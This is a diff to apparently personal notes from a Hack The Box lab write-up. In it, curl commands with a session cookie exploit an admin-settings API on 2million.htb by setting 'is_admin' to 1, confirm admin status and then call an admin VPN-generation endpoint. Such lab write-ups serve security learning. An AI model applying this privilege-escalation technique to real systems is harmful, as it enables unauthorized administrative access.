@@ -131,7 +131,32 @@ curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX PUT http://2million.htb
 curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb"}' | jq
 ```
 ![[Pasted image 20230903224712.png]]
-- It's asking if we're the admin, so run another curl with this item in the request
+- It's asking if we're the admin, so run another curl with this item set to true in the request
+``` bash
+curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb", "is_admin":true}' | jq
 ```
 
+You'll receive an error message stating "Variable is_admin needs to be either 0 or 1"...so, you know what to do...
+``` bash
+curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb", "is_admin":1}' | jq
 ```
+
+![[Pasted image 20230903230123.png]]
+
+- We've now verified ourselves as the admin
+- Running the following, we determine this to be true
+```
+curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -sv http://2million.htb/api/v1 | jq
+```
+
+![[Pasted image 20230903230718.png]]
+
+- Verified user is the admin
+- Generate a vpn certificate for this user
+
+```
+curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb", "is_admin":1}' | jq
+```
+
+- New error message "Missing parameter: username"
+![[Pasted image 20230903231455.png]]
